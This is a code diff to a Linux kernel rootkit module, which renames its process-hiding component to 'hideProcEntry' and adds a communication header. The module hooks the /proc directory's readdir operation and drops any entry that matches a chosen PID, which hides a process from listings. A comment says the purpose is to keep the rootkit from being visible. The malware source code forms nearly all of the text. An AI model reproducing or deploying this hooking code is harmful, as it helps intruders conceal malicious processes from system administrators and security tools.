@@ -8,9 +8,8 @@
 #include <linux/proc_fs.h>
 #include <linux/version.h>
 
-#define PID_TO_HIDE "1615"
-
-#include "processHider.h"
+#include "hideProcEntry.h"
+#include "communication.h"
 /*
 Related things to manipulate to prevent rootkit being visable:
  * average cpu usage
@@ -30,8 +29,7 @@ unsigned hidden_pid_count = 0;
 void hook_proc(struct proc_dir_entry *root);
 
 
-int processHider_init(void) {
-	
+int hideProcEntry_init(void) {
 	static struct file_operations fileops_struct = {0};
 	struct proc_dir_entry *new_proc;
 	// dummy to get proc_dir_entry of /proc_create
@@ -43,12 +41,6 @@ int processHider_init(void) {
 	
 	return 0;
 }
-
-//TODO: add / info on what to hide
-void hideProcess(void) {
-	// from base.c 	//struct mm_struct *mm = get_task_mm(task); 
-}
-
 
 
 void hook_proc(struct proc_dir_entry *root) {
@@ -84,7 +76,7 @@ void hook_proc(struct proc_dir_entry *root) {
 
 
 int fake_proc_fill_dir(void *a, const char *buffer, int c, loff_t d, u64 e, unsigned f) {
-	char *tohidePID = PID_TO_HIDE; //TODO: make it possible to specify the pid to hide in an easier way...
+	char *tohidePID = PROC_ENTRY; //TODO: make it possible to specify the pid to hide in an easier way...
 	
 	int doStringsMatch = (strcmp(buffer, tohidePID) == 0);
 	
@@ -103,7 +95,7 @@ static int do_readdir_proc (struct file *fp, void *buf, filldir_t fdir) {
 	
 	return originalProc->readdir(fp, buf, fake_proc_fill_dir);
 }
-void processHider_exit(void) {
+void hideProcEntry_exit(void) {
 	if (originalProc != NULL) {
 		if (pinode != NULL) {
 			pinode->i_fop = originalProc;
